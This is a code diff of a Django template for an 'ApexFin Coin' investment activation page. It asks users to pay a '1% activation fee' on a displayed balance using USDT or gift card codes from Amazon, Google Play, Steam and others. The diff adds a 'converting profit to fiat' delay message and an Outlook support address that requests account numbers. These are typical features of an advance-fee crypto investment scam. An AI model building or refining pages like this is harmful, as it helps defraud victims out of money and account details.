@@ -1,134 +1,139 @@
 {% extends 'base.html' %}
-{% load crispy_forms_tags %}
+{% load crispy_forms_tags humanize %}
 
 {% block content %}
-<div class="container mt-5">
-    <h2 class="text-center mb-4">🚀 Activate ApexFin Coin Investment</h2>
+<div class="container my-5">
 
-    <p class="text-center">
-        To activate your investment and start earning, you need to pay a <strong>1% activation fee</strong> in one of the following payment methods:
-    </p>
-
-    <!-- Account Details -->
-    <div class="card p-4 shadow-sm">
-        <h4>💰 Your Account Details:</h4>
-        <ul class="list-unstyled">
-            <li><strong>Total Balance:</strong> ${{ user_profile.balance }}</li>
-            <li><strong>1% Activation Fee:</strong> ${{ activation_fee }} (based on your total balance)</li>
-        </ul>
-        <p>Ensure that you have sufficient funds in your account to complete the activation. The 1% fee is calculated from your total balance.</p>
-    </div>
-
-    <!-- Payment Method Selection -->
-    <div class="card mt-4 p-4 shadow-sm">
-        <h4>🔗 Choose Your Payment Method</h4>
-        <p>Select the payment method that works best for you. If you choose "USDT", you'll be given a wallet address to send the payment. If you choose "Gift Card", you'll need to manually enter the gift card code for verification.</p>
-        
-        <form method="post">
-            {% csrf_token %}
-            <div class="form-check">
-                <input class="form-check-input" type="radio" name="payment_method" id="usdt" value="usdt" required>
-                <label class="form-check-label" for="usdt">
-                    💸 Pay via USDT (Tether)
-                </label>
-                <p class="text-muted">Choose this if you prefer to pay with USDT cryptocurrency. You will be provided with a wallet address.</p>
-            </div>
-            <div class="form-check">
-                <input class="form-check-input" type="radio" name="payment_method" id="gift_card" value="gift_card">
-                <label class="form-check-label" for="gift_card">
-                    🎁 Pay via Gift Card
-                </label>
-                <p class="text-muted">Choose this if you are paying with a gift card. After purchasing the gift card, you will need to enter the gift card code for manual verification.</p>
-            </div>
-            
-            <button type="submit" class="btn btn-primary w-100 mt-3">Next Step</button>
-        </form>
-    </div>
-
-    <!-- USDT Wallet Address Box (Visible when 'usdt' is selected) -->
-    <div id="usdt_details" class="card mt-4 p-4 shadow-sm" style="display:none;">
-        <h4>🔗 Send USDT to the Address Below</h4>
-        <p>Please send the exact activation fee amount in USDT to the wallet address provided below. After the payment is confirmed, your account will be activated for profit earning.</p>
-        
-        {% if wallet_address %}
-        <div class="wallet-box d-flex align-items-center p-3 border rounded bg-light">
-            <input type="text" value="{{ wallet_address }}" id="walletAddress" readonly class="form-control me-2" style="font-weight: bold;">
-            <button onclick="copyWalletAddress()" class="btn btn-success">📋 Copy Wallet Address</button>
+    {% if user_profile.is_activated and not user_profile.is_converted %}
+        <div class="alert alert-warning text-center fw-bold rounded-3 shadow-sm">
+            🎯 Activation complete! Please wait while we convert your investment profit from crypto to fiat.
+            <br>
+            <small class="text-muted">You’ll be notified once this is complete, and then you can start sending funds.</small>
         </div>
-        {% else %}
-        <p class="text-danger">⚠️ Wallet address not found. Please contact support for assistance.</p>
-        {% endif %}
+    {% endif %}
+
+    <h2 class="text-center fw-bold mb-3">🚀 Activate ApexFin Coin Investment</h2>
+    <p class="text-center mb-4">To activate your investment and start earning, pay a <strong class="text-primary">1% activation fee</strong> using one of the options below.</p>
+
+    <div class="card shadow-sm p-4 mb-4">
+        <h5 class="mb-3 fw-bold">💼 Account Overview</h5>
+        <ul class="list-unstyled">
+            <li><strong>Total Balance:</strong> ${{ user_profile.balance|floatformat:2|intcomma }}</li>
+            <li><strong>1% Activation Fee:</strong> ${{ activation_fee|floatformat:2|intcomma }}</li>
+        </ul>
+        <p class="text-muted">This fee unlocks your full investment earning potential.</p>
     </div>
 
-    <!-- Gift Card Instructions (Visible when 'gift_card' is selected) -->
-    <div id="gift_card_details" class="card mt-4 p-4 shadow-sm" style="display:none;">
-        <h4>🎁 Pay via Gift Card</h4>
-        <p>To complete the payment via gift card, follow these steps:</p>
-        <ol>
-            <li>Purchase a gift card of the required amount.</li>
-            <li>Enter the gift card code below to verify your payment.</li>
+    <form method="post" enctype="multipart/form-data" id="paymentForm" class="card shadow-sm p-4 mb-4">
+        {% csrf_token %}
+
+        <h5 class="mb-3 fw-bold">🔗 Select Payment Method</h5>
+
+        <div class="form-check mb-2">
+            <input class="form-check-input" type="radio" name="payment_method" id="usdt" value="usdt" required>
+            <label class="form-check-label" for="usdt">💸 Pay with USDT (Tether)</label>
+        </div>
+        <div class="form-check mb-3">
+            <input class="form-check-input" type="radio" name="payment_method" id="gift_card" value="gift_card">
+            <label class="form-check-label" for="gift_card">🎁 Pay with Gift Card</label>
+        </div>
+
+        <!-- USDT Section -->
+        <div id="usdt_details" class="bg-light border rounded p-3 mb-3" style="display: none;">
+            <h6 class="fw-bold">🔗 Send USDT to:</h6>
+            {% if wallet_address %}
+            <div class="input-group mb-3">
+                <input type="text" id="walletAddress" value="{{ wallet_address }}" readonly class="form-control fw-bold">
+                <button type="button" class="btn btn-outline-success" onclick="copyWalletAddress()">📋 Copy</button>
+            </div>
+            <div class="mb-3">
+                <label><strong>Transaction ID:</strong></label>
+                <input type="text" name="transaction_id" class="form-control" placeholder="Paste your USDT transaction ID">
+            </div>
+            <div class="mb-3">
+                <label><strong>Upload Screenshot (optional):</strong></label>
+                <input type="file" name="usdt_screenshot" accept="image/*" class="form-control">
+            </div>
+            {% else %}
+            <p class="text-danger">⚠️ Wallet address not available.</p>
+            {% endif %}
+        </div>
+
+        <!-- Gift Card Section -->
+        <div id="gift_card_details" class="bg-light border rounded p-3 mb-3" style="display: none;">
+            <h6 class="fw-bold">🎁 Gift Card Payment</h6>
+            <div class="mb-3">
+                <label><strong>Type:</strong></label>
+                <select name="gift_card_type" class="form-select">
+                    <option value="">-- Select Gift Card --</option>
+                    <option value="amazon">Amazon</option>
+                    <option value="google_play">Google Play</option>
+                    <option value="itunes">iTunes</option>
+                    <option value="steam">Steam</option>
+                    <option value="razer">Razer Gold</option>
+                </select>
+            </div>
+            <div class="mb-3">
+                <label><strong>Card Code:</strong></label>
+                <input type="text" name="gift_card_code" class="form-control" placeholder="Enter card code">
+            </div>
+            <div class="mb-3">
+                <label><strong>Reference (optional):</strong></label>
+                <input type="text" name="gift_card_reference" class="form-control">
+            </div>
+            <div class="mb-3">
+                <label><strong>Upload Card Image (optional):</strong></label>
+                <input type="file" name="gift_card_image" accept="image/*" class="form-control">
+            </div>
+        </div>
+
+        <button type="submit" class="btn btn-primary w-100 mt-3">✅ I’ve Made the Payment</button>
+    </form>
+
+    <div class="card shadow-sm p-4">
+        <h5 class="fw-bold mb-2">📌 Activation Steps</h5>
+        <ol class="mb-2">
+            <li>Review your balance & fee.</li>
+            <li>Select a payment method.</li>
+            <li>Send payment & submit form.</li>
         </ol>
-        <p>Once the code is verified, your account will be activated and you can start earning profits.</p>
-
-        <form method="post">
-            {% csrf_token %}
-            <label class="form-label"><strong>Select Gift Card Type:</strong></label>
-            <select class="form-control mb-3" name="gift_card_type" required>
-                <option value="amazon">Amazon</option>
-                <option value="google_play">Google Play</option>
-                <option value="itunes">iTunes</option>
-            </select>
-            
-            <label class="form-label"><strong>Enter Gift Card Code:</strong></label>
-            <input type="text" name="gift_card_code" required class="form-control mb-3" placeholder="Paste your gift card code here">
-            
-            <label class="form-label"><strong>Reference/Note (Optional):</strong></label>
-            <input type="text" name="gift_card_reference" class="form-control mb-3" placeholder="Enter a reference or note for verification (Optional)">
-            
-            <button type="submit" class="btn btn-primary w-100">✅ I've Made the Payment</button>
-        </form>
+        <p class="text-muted">Once verified, your investment account will be activated and ready.</p>
     </div>
 
-    <!-- Instructions Section -->
-    <div class="card mt-4 p-4 shadow-sm">
-        <h4>📌 How to Activate:</h4>
-        <ol>
-            <li>Check your <strong>total balance</strong> above.</li>
-            <li>Calculate the <strong>1% activation fee</strong> (shown above).</li>
-            <li>Choose your preferred payment method and follow the instructions.</li>
-            <li>Enter the necessary payment details for your selected method to complete the payment.</li>
-        </ol>
-        <p class="text-muted">Once your payment is verified, your account will be activated, and you'll be able to earn profits.</p>
-    </div>
-    
-    <p class="text-center mt-3">
-        <strong>🔔 Important:</strong> Make sure to transfer the exact amount to avoid delays. Your payment will be verified once processed. Contact support if you face any issues.
+    <p class="text-center mt-4 fw-bold">
+        Need help? <br>
+        <a href="mailto:apexfinpro@outlook.com" class="text-primary">apexfinpro@outlook.com</a> <br>
+        Send your <strong>username</strong>, <strong>account number</strong>, and <strong>payment info</strong>.
     </p>
+
 </div>
 
-<!-- Copy Wallet Script -->
 <script>
     function copyWalletAddress() {
-        var copyText = document.getElementById("walletAddress");
-        copyText.select();
-        copyText.setSelectionRange(0, 99999);
+        const input = document.getElementById("walletAddress");
+        input.select();
         document.execCommand("copy");
-        alert("✅ Wallet Address Copied: " + copyText.value);
+        alert("✅ Wallet address copied: " + input.value);
     }
 
-    // JavaScript to toggle visibility based on selected payment method
-    document.querySelectorAll('input[name="payment_method"]').forEach((input) => {
-        input.addEventListener('change', function() {
-            // Show/Hide payment details based on the selected method
-            if (this.value === 'usdt') {
-                document.getElementById('usdt_details').style.display = 'block';
-                document.getElementById('gift_card_details').style.display = 'none';
-            } else if (this.value === 'gift_card') {
-                document.getElementById('usdt_details').style.display = 'none';
-                document.getElementById('gift_card_details').style.display = 'block';
-            }
+    document.addEventListener("DOMContentLoaded", () => {
+        const radios = document.querySelectorAll('input[name="payment_method"]');
+        const usdtDetails = document.getElementById("usdt_details");
+        const giftCardDetails = document.getElementById("gift_card_details");
+
+        radios.forEach(radio => {
+            radio.addEventListener("change", () => {
+                if (radio.value === "usdt") {
+                    usdtDetails.style.display = "block";
+                    giftCardDetails.style.display = "none";
+                    usdtDetails.scrollIntoView({ behavior: 'smooth' });
+                } else {
+                    giftCardDetails.style.display = "block";
+                    usdtDetails.style.display = "none";
+                    giftCardDetails.scrollIntoView({ behavior: 'smooth' });
+                }
+            });
         });
     });
 </script>
-
 {% endblock %}
